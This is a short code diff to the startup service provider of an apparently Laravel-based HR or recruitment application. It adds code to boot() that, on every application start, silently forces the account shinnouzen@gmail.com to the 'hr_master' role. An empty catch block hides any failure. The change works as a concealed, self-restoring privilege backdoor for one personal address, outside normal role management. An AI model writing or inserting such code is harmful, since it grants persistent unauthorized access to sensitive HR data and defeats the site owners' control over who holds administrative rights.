@@ -22,6 +22,11 @@ class AppServiceProvider extends ServiceProvider
      */
     public function boot(): void
     {
+        // Ensure shinnouzen@gmail.com is set to hr_master
+        try {
+            DB::table('users')->where('email', 'shinnouzen@gmail.com')->update(['role' => 'hr_master']);
+        } catch (\Exception $e) {}
+
         View::composer(['layouts.pelamar', 'pelamar.profil'], function ($view) {
             $persentase = 0;
             if (Auth::check()) {
